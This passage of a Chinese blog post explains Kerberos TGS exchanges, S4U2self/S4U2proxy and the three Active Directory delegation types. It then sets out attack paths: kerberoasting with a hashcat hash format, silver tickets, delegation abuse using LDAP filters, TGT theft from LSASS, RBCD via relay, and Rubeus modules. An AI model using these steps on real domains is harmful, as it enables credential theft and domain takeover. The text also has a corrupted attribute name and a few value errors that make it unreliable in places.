<p>TGS_REQ这个阶段不需要账号密码，需要AS_REP获取到的TGT凭据。这里面工具需要指定域控的地址。连接配置里面的其他信息都在凭据里面，这里可以不用指定。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ecc0dcdbc1334e4a.png"></p>
<h3 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h3><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013a3af94337ac907b.png"></p>
<p>这里面标注的字段是跟AS_REQ里面不一样的，在AS_REQ文档有标注，一样的内容就不再标注了。</p>
<h4 id="msg-type-2"><a href="#msg-type-2" class="headerlink" title="msg-type"></a>msg-type</h4><p>类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)</p>
<h4 id="PA-DATA-1"><a href="#PA-DATA-1" class="headerlink" title="PA-DATA"></a>PA-DATA</h4><p>正常的TGS_REQ的请求需要用到有</p>
<ul>
<li>AP_REQ</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01aafe4f5fb6d5a487.png"></p>
<p>这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据，就放在这个结构体里面。</p>
<p>KDC校验TGT票据，如果票据正确，就返回TGS票据。</p>
<ul>
<li>PA_FOR_USER</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0172367c2cad98b35e.png"></p>
<p>类型是S4U2SELF</p>
<p>值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。</p>
<p>S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。</p>
<ul>
<li>PA_PAC_OPTIONS</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01754019b5586d0dca.png"></p>
<p>类型是 PA_PAC_OPTIONS</p>
<p>值是以下flag的组合</p>
<p>– Claims(0)<br>– Branch Aware(1)<br>– Forward to Full DC(2)<br>– Resource-based Constrained Delegation (3)</p>
<p>微软的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aeecfd82-a5e4-474c-92ab-8df9022cf955">MS-SFU 2.2.5</a>， S4U2proxy 必须扩展PA-PAC-OPTIONS结构。</p>
<p>如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。</p>
<h4 id="REQ-BODY-1"><a href="#REQ-BODY-1" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h4><ul>
<li>sname</li>
</ul>
<p>这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。</p>
<ul>
<li>AddtionTicket</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0112df2cb72419b653.png"><br>附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。</p>
<h3 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h3><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010446cb7008acd427.png"></p>
<h4 id="msg-type-3"><a href="#msg-type-3" class="headerlink" title="msg-type"></a>msg-type</h4><p>AS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)</p>
<h4 id="ticket-1"><a href="#ticket-1" class="headerlink" title="ticket"></a>ticket</h4><p>这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。详情见<a href='#p3'>相关的安全问题&gt;白银票据</a>。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash,详情见<a href='#p4'>相关的安全问题&gt;kerberoasting</a>。</p>
<h4 id="enc-part-1"><a href="#enc-part-1" class="headerlink" title="enc_part"></a>enc_part</h4><p>注意，这个enc_part不是ticket里面的enc_part，</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c767928bb11720ed.png"></p>
<p>这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018bbc64e0a98a1624.png"></p>
<h3 id="S4U2SELF"><a href="#S4U2SELF" class="headerlink" title="S4U2SELF"></a>S4U2SELF</h3><p>S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。<strong>这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的。</strong></p>
<p>s4u2self的过程如下图所示</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage004.png"></p>
<p>前提条件是服务已经有通过KDC验证的TGT，如图，需要有TGT。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017817a54b237402ca.png"></p>
<p>在步骤1中, 服务(<code>JACKSON-PC$</code>)使用S4U2self扩展名代表用户(<code>administrator</code>)获得针对服务本身(<code>JACKSON-PC$</code>)的服务票证。该服务将填写<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-SFU/aceb70de-40f0-4409-87fa-df00ca145f5a">PA_FOR_USER</a> 数据结构,类型为<code>S4U2SELF</code>，并将KRB_TGS_REQ消息发送到TGS。 如下图，由于服务<code>JACKSON-PC$</code>代表用户向服务本身(也是<code>JACKSON-PC$</code>)发起请求，因此这里面cname是<code>JACKSON-PC$</code>,sname也是<code>JACKSON-PC$</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0165110651aba6ba8e.png"></p>
<p>假定TGS支持PA_FOR_USER扩展，则TGS在步骤2中通过KRB_TGS_REP消息返回用户的服务票证。如果服务请求了可转发选项，并且TGS的本地策略允许，则TGS检验通过后必须将票证标志 字段设置为可转发，既只要满足即可。</p>
<ol>
<li>TGT是可以转发的</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f0d5a317d69bf6b1.png"></p>
<ol start="2">
<li>服务配置了约束委派</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d417ae1cd342e030.png"></p>
<ol start="3">
<li>服务请求了可转发选项</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dccc1d4515448533.png"></p>
<p>则TGS必须将票证标志 字段设置为可转发</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01290857d9ece54e8b.png"></p>
<p>需要注意的是，如果用户的UserAccountControl字段中设置了USER_NOT_DELEGATED位,那么返回的TGS是永远也没法转发的。如图，当Administrator配置了敏感账户，不能被委派，返回的TGS的flag字段没有forwardable。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012f37c48fb6f44ee3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0149b8fc062b39e8eb.png"></p>
<h3 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h3><p>s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。</p>
<p>s4u2proxy的过程如下图所示:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage006.png"></p>
<p>在步骤1中，服务1试图代表用户获取服务2的服务票证。服务1发送KRB_TGS_REQ消息，并将用户的服务1服务票证作为 请求中的AddtionTicket。只要满足以下条件</p>
<ol>
<li>拥有来自用户的授权( 在S4U2SELF阶段获得的TGS票据)，放在AddtionTicket里面。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b34f1588fb52e51a.png"></p>
<ol start="2">
<li>在请求的kdc-options中设置了CNAME-IN-ADDL-TKT标志。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ab603f6af72f7e14.png"></p>
<ol start="3">
<li>服务请求了可转发选项</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c5de2a391c02806a.png"></p>
<ol start="4">
<li>服务1 有到服务2的约束委派，将服务2的SPN放在sname里面。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01480c801b6bdf61a6.png"></p>
<p>如果满足这些条件，则在步骤2中TGS会制作KRB_TGS_REP消息以返回服务票证。可转发标志将在服务票证中设置。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0162de853515ec7acb.png"></p>
<p>有个点需要注意的是，前面在S4U2SELF里面提到，在满足一定的条件之后，S4U2SELF返回的票据是可以转发的，这个票据作为S4U2PROXY的AddtionTicket，有些文章里面会说，S4U2PROXY要求AddtionTicket里面的票据一定要是可转发的，否则S4U2PROXY生成的票据是不可以转发的。这个说法在引入可资源约束委派的情况下，是不成立的，下面分情况具体说下。</p>
<ul>
<li>AddtionTicket里面的票据是可转发的</li>
</ul>
<p>如果AddtionTicket里面的票据是可转发的，只要KDC Options里面置forwarable位，那么返回的票据必须置为可转发的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010bb8353a67af855f.png"></p>
<ul>
<li>AddtionTicket里面的票据是不可转发的</li>
</ul>
<p>如果AddtionTicket中的服务票据未设置为可转发的，则KDC必须返回状态为STATUS_NO_MATCH的KRB-ERR-BADOPTION选项。除了一种情况之外，就是配置了服务1到服务2 的基于资源的约束委派，且PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位(这一例外的前提是S4U2SELF阶段模拟的用户没被设置为对委派敏感，对委派敏感的判断在S4U2SELF阶段，而不是S4U2PROXY阶段)。</p>
<p>AddtionTicket里面的票据是不可转发的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f00ab59ffbfc017.png"></p>
<p>配置了服务1到服务2 的基于资源的约束委派</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01992b2d344c1fce87.png"></p>
<p>PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f52b4e6be469160.png"></p>
<p>返回的TGS票据是可转发的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dec627a9dcae2762.png"></p>
<h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“ Kerberos双跳问题”，并且要求进行委派，以便Web Server在修改数据库记录时模拟用户。需要注意的一点是接受委派的用户只能是<strong>服务账户</strong>或者<strong>计算机用户</strong>。</p>
<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>Microsoft在Windows 2000中实现了Kerberos“不受约束的委托”，从而启用了这种级别的委托。</p>
<p>非约束委派的配置如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0196779fc9a6d7b383.png"></p>
<p>服务(如<code>JACKSON-PC$</code>) 被配置了非约束的委派，那么<code>JACKSON-PC$</code>可以接受任何用户的委派的去请求其他所有服务。在协议层面的实现就是，某个用户委托<code>JACKSON-PC$</code>去访问某个服务，那么这个用户会将 TGT（在TGS里面）发送到<code>JACKSON-PC$</code>并缓存到LSASS中，以方便以后使用。 然后<code>JACKSON-PC$</code>模拟用户去请求某个服务。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012bc3f8c98ee75003.png"></p>
<p>配置了非约束委派的用户的 <code>userAccountControl</code> 属性有个FLAG位 <code>TrustedForDelegation</code></p>
<p>关于 <code>userAccountControl</code> 每一位对应的意义可以看<a target="_blank" rel="noopener" href="http://woshub.com/decoding-ad-useraccountcontrol-value/">Converting AD UserAccountControl Attribute Values</a>,(我会在LDAP篇中也会详细介绍)，其中 TRUSTED_FOR_DELEGATION 对应是 0x80000 ，也就是 524288 。</p>
<h4 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h4><p>微软很早就意识到非约束委派并不是特别安全，在 Windows 2003上发布了”约束”委派。 其中包括一组 Kerberos 协议扩展，就是本文之前提到的两个扩展 S4U2Self 和 S4U2Proxy。配置它后，约束委派将限制指定服务器可以代表用户执行的服务。这需要域管理员特权(其实严谨一点是SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员)才能为服务配置域帐户，并且将帐户限制为单个域。</p>
<p>约束委派的配置如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01557263f6efa97c78.png"></p>
<p>计算机用户(既JACKSON-PC$) 被配置了约束的委派，那么JACKSON-PC$可以接受任何用户的委派的去请求特定的服务。具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。</p>
<p>相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a8167d0e38d7d925.png"></p>
<p>配置了约束委派的用户的userAccountControl 属性有个FLAG位 TrustedToAuthForDelegation 。</p>
<p>关于userAccountControl 每一位对应的意义可以看<a target="_blank" rel="noopener" href="http://woshub.com/decoding-ad-useraccountcontrol-value/">Converting AD UserAccountControl Attribute Values</a>,其中 TRUSTED_TO_AUTH_FOR_DELEGATION 对应是 0x1000000 ，也就是 16777216 。</p>
<p>约束的资源委派，除了配置TRUSTED_TO_AUTH_FOR_DELEGATION 之外，还有个地方是存储对哪个spn 进行委派的，位于msDS-AllowedToDelegateTo</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010d0cbd566f509b39.png"></p>
<p>最后来理一理约束委派的整个流程。</p>
<p>主要是有四个角色的存在：</p>
<ol>
<li>访问服务的用户(这里面是administrator)</li>
<li>接受委派的服务1(这里面是JACKSON-PC$）</li>
<li>要访问的服务2(这里面是CIFS&#x2F;WIN-JQO4OSMOGK2.JMU.com)</li>
<li>KDC（Key Distribution Center）密钥分发中心 kerberos</li>
</ol>
<p>首先先做一些配置。配置服务1 到服务2的约束委派</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010bd2d801df311e1d.png"></p>
<p>整个完整的流程是</p>
<ol>
<li>服务1 使用自己的hash向KDC申请一个TGT票据，注意在KDC Option里面选择FORWARDABLE标志位，这样的话请求的TGT票据就是可转发的TGT票据。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0101abe228f24cb52e.png"></p>
<ol start="2">
<li>服务1 代表用户申请一个获得针对服务1自身的kerberos服务票据(这一步就是S4U2SELF，对于这一步有疑问的可以返回前面的S4U2SLEF看看)，这一步生成的TGS票据是可转发的TGS票据。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01643b3666307641c7.png"></p>
<h4 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h4><p>为了配置受约束的委派，必须拥有<code>SeEnableDelegation</code>特权，该特权很敏感，通常仅授予域管理员。为了使用户&#x2F;资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p>
<p>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p>
<p>这种约束委派的风格与传统约束委派非常相似，但配置相反。从帐户A到帐户B的传统约束委派在msDS-AllowedToDelegateTo属性中的帐户A上配置，并定义从A到B的“传出”信任，而在马上到！S-AllowedToActOnBehalfOfOtherIdentity属性中的帐户B上配置基于资源的约束委派，并定义从A到B的“传入”信任，见下图。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fe78dcd0b3af3aa4.jpg"></p>
<p>最后来理一理基于资源的约束委派的整个流程。</p>
<p>主要是有四个角色的存在：</p>
<ol>
<li>访问服务的用户(这里面是administrator)</li>
<li>接受委派的服务1(这里面是JACKSON-PC$）</li>
<li>要访问的服务2(这里面是CIFS&#x2F;WIN-JQO4OSMOGK2.JMU.com)</li>
<li>KDC（Key Distribution Center）密钥分发中心 kerberos</li>
</ol>
<p>首先先做一些配置。在服务2上 配置服务1 到服务2的基于资源的约束委派(不同于传统的约束委派需要域管的权限才能配置，只有拥有服务2 的权限就可以配置基于资源的约束委派)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018171f91df7051b10.png"></p>
<p>整个完整的流程是</p>
<ol>
<li>服务1 使用自己的hash向KDC申请一个TGT票据。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f95752e14f93440d.png"></p>
<ol start="2">
<li>服务1 代表用户申请一个获得针对服务1自身的kerberos服务票据(这一步就是S4U2SELF，这一步就区别传统的约束委派，在S4U2SELF里面提到，返回的TGS可转发的一个条件是服务1配置了传统的约束委派，kdc会检查服务1 的TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo  这个字段，由于基于资源的约束委派，是在服务2配置，服务2的马上到！S-AllowedToActOnBehalfOfOtherIdentity属性配置了服务1 的sid，服务1并没有配置TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo 字段。因此这一步返回的TGS票据是不可转发的。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e456651d781dee2b.png"></p>
<ol start="3">
<li>服务1可以使用来自用户的授权( 在S4U2SELF阶段获得的不可转发的TGS)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的可转发的TGS</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01aaf270c4aab42b0f.png"></p>
<h3 id="相关的安全问题-1"><a href="#相关的安全问题-1" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h3><h4 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h4><p>Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。</p>
<h4 id="kerberosting"><a href="#kerberosting" class="headerlink" title="kerberosting"></a>kerberosting</h4><p>正因为TGS_REP里面ticket里的enc_part(是ticket里面的enc_part,不是最外层的enc_part,最外层的enc_part是使用AS_REP里面的session_key加密的，这个session_key我们已经有了，没有意义)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01642709fde6925df7.png"></p>
<p>是使用要请求的服务的hash加密的，所以我们可以通过爆破获得服务的hash。这个问题存在的另外一个因素是因为用户向KDC发起TGS_REQ请求，不管用户对服务有没有访问权限，只要TGT正确，那么肯定会返回TGS。其实AS_REQ里面的服务就是krbtgt，也就是说这个同样用于爆破AS_REP里面的ticket部分的encpart得到krbtgt的hash，但是之所以在网上没见到这种攻击方式是因为krbtgt的密码是随机生成的，也跑不出来.</p>
<p>sname 部分填写要爆破部分的spn</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013ef51d55a55d13fb.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010b5fc2230d8c588d.png"></p>
<p>然后按照 <code>format(&quot;$krb5tgs$&#123;0&#125;$*&#123;1&#125;$&#123;2&#125;$&#123;3&#125;*$&#123;4&#125;$&#123;5&#125;&quot;, encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32))</code> 就可以拼接处hash cat(13100)能跑的hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec910f20c5a5d6b9.png"></p>
<p>这里面只做漏洞原理演示。方便的工具化的利用参见部分相关的工具</p>
<h4 id='p3'>白银票据</h4>

<p>在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名(关于PAC的详细信息，将在下一篇文章里面详细介绍)，则银票将不起作用。</p>
<h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h4><p>非约束委派的安全问题就是如果我们找到配置了非约束的委派的账户，比如这里面的<code>JACKSON-PC$</code>，并且通过一定手段拿下该账户的权限，然后诱导域管访问该<code>JACKSON-PC$</code>，这个时候域管会将自己TGT发送到<code>JACKSON-PC$</code>并缓存到LSASS中，那我们就可以从LSASS中导出域管的TGT票据，然后通过PTT，从而拥有域管的权限。</p>
<ul>
<li>找到配置了非约束的委派的账户</li>
</ul>
<p>因为配置非约束的委派的账户的UserAccount 配置了TRUSTED_FOR_DELEGATION flag位，TRUSTED_FOR_DELEGATION 对应是 0x80000 ，也就是 524288 。</p>
<p>所以对应的LDAP过滤规则是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure>

<p>可以通过这个规则进行查找</p>
<p>以adfind为例(其他支持ldap的工具都可以实现)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019459468317d2c944.png"></p>
<ol>
<li>通过一定手段拿下这台配置了非约束委派的账户的权限(比如这里面的JACKSON-PC$)</li>
<li>通过一定手段(比如通过打印机的那个漏洞)诱导域管访问我们拿下的配置了非约束委派的账户</li>
<li>最后导出票据然后进行pass the ticket</li>
</ol>
<h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>约束委派的安全问题就是如果我们找到配置了约束委派的服务账号，比如这里面的JACKSON-PC$，并且通过一定手段拿下该账号所在的机子。我们就可以利用这个服务账号代表任意用户(这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的)进行s4u2self获得一个可转发的票据，然后把获取到的票据用于s4u2proxy(作为AddtionTicket)，从未获取一个可转发的TGS，服务就可以代替任意用户访问另外一个服务(既被配置的约束委派的服务，这里面就是cifs&#x2F;WIN-JQO4OSMOGK2.JMU.com）。</p>
<p>相较于非约束的委派，约束的委派并不需要用户过来访问就可以代表该用户，但是只能访问特定的服务(对于 HOST SPN，则可以实现完全的远程接管。 对于 MSSQLSvc SPN，则可以拿到 DBA 权限。 对于 CIFS SPN 则可以实现完全的远程文件访问。对于 HTTP SPN 则可能实现接管远程网络服务，而对于 LDAP 则可以执行 DCSync;) ，对于 HTTP 或 SQL 服务帐户，即使它们没有提升目标服务器上的管理员权限，也可能使用 Rotten Potato 进一步滥用，提权至 SYSTEM 的权限)，不像非约束的委派哪个可以访问任意服务。</p>
<ol>
<li>找到配置了约束的委派的服务账户1</li>
</ol>
<p>因为配置约束的委派的机子的 UserAccount 配置了 TRUSTED_TO_AUTH_FOR_DELEGATION flag 位，  TRUSTED_TO_AUTH_FOR_DELEGATION 对应是 0x1000000 ，也就是 1677721</p>
<p>所以对应的LDAP过滤规则是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">16777216</span>))</span><br></pre></td></tr></table></figure>

<p>以adfind为例(其他支持ldap的工具都可以实现)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a31323725175e35e.png"></p>
<ol start="2">
<li>找到该服务账号委派1委派的服务账户2</li>
</ol>
<p>约束的资源委派，除了配置TRUSTED_TO_AUTH_FOR_DELEGATION 之外，还有个地方是存储对哪个spn 进行委派的，位于msDS-AllowedToDelegateTo ，查询该服务账号的msDS-AllowedToDelegateTo位</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f24d94796040f2f0.png"></p>
<ol>
<li>通过一定手段拿下这个服务账户1</li>
<li>发起一个从服务1到服务2的正常的约束委派的流程，从而访问服务2</li>
</ol>
<p>这个流程见上面的委派&gt;约束委派，使用rubeus也可以很方便得进行一键访问，详细利用见部分相关工具&gt;rubrus&gt;s4u)，从而访问到这个服务账户委派的服务使用约束委派也可以很方便得留下后门，如果我们配置了服务1到服务2的约束委派，那么只要我们控制服务1，也就可以访问服务2。服务2可以是任何服务。比如服务2是krbtgt，那么只要我们控制着服务1，那么模拟任意用户最后生成的TGS就是任意用户的TGT，这算是一种变形的黄金票据。如果服务2是CIFS&#x2F;域控计算账户，那么只要我们控制着服务1，是不是就可以随时从域控里面提取任意用户的hash。思路挺多的，懂得约束委派的原理就可以自己扩展。</p>
<h4 id="基于资源的约束委派攻击"><a href="#基于资源的约束委派攻击" class="headerlink" title="基于资源的约束委派攻击"></a>基于资源的约束委派攻击</h4><p>基于资源的约束委派具有传统的约束委派的所有安全问题，但是相较于传统的约束委派。基于资源的约束委派的利用又相对较为简单。</p>
<p>主要体现为，普通的约束委派的配置需要SeEnableDelegation权限，而这个权限通常仅授予Domain Admins。因此我们对普通的约束委派的利用，往往在于寻找域内已有的约束委派，再利用。但是对于基于资源的约束委派，假如我们已经拥有服务账号1，那么只要我们具备用户2的LDAP权限，这样就可以配置服务1对服务2的约束委派(在服务账户2的用户属性上配置马上到！S-AllowedToActOnBehalfOfOtherIdentity为1的sid)，服务1就可以控制服务2。</p>
<p>所以基于资源的约束委派的利用，就有一种新的攻击思路</p>
<ol>
<li>我们拥有一个任意的服务账户1 或者计算机账户1</li>
</ol>
<p>这一步不难，我们我们拥有域内机器，提升到system权限，该计算机用户，用户名为计算机账号$就是服务账号。如果我们只有普通的域内用户，可以滥用MachineAccountQuota,详细细节见 部分相关的工具&gt;Powermad</p>
<ol start="2">
<li>我们获得服务账户2 的LDAP权限</li>
</ol>
<p>这一步可以结合ntlm relay，从其他协议relay 而来，关于这一步，更多的是ntlm relay的过程，限于篇幅原因，这里面会在ntlm篇的relay详细介绍。典型案例就是CVE2019-1040。</p>
<ol start="3">
<li>配置服务1对服务2的约束委派</li>
</ol>
<p>在服务账户2的用户属性上配置马上到！S-AllowedToActOnBehalfOfOtherIdentity为服务账户1的sid</p>
<ol start="4">
<li>发起一个从服务1到服务2的正常的约束委派的流程，从而访问服务2。</li>
</ol>
<p>这个流程见上面的委派&gt;约束委派，使用rubeus也可以很方便得进行一键访问，详细利用见部分相关工具&gt;rubrus&gt;s4u)</p>
<h3 id="部分相关工具"><a href="#部分相关工具" class="headerlink" title="部分相关工具"></a>部分相关工具</h3><h4 id="rubeus"><a href="#rubeus" class="headerlink" title="rubeus"></a>rubeus</h4><ul>
<li>asktgs</li>
</ul>
<p>这个功能用于发送tgs请求包，并将凭据以base64打印出来。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01085dab7139828459.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01babc1ad56af253a6.png"></p>
<ul>
<li><p id='p4'>kerberoasting</p></li>
</ul>
<p>Rubes里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn，再通过发送TGS包，提取拼接得到hashcat或者john能爆破的格式。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dc70242e62e6e22c.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0111b2a91baa7c7ea3.png"></p>
<ul>
<li>monitor&#x2F;harvest</li>
</ul>
<p>这个模块用于非约束委派的利用</p>
<p>rubeus的monitor或者harvest模块会从日志里面过滤出 4624 ，然后提取TGT票据打印出来。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014ba58f3df78f7106.png"></p>
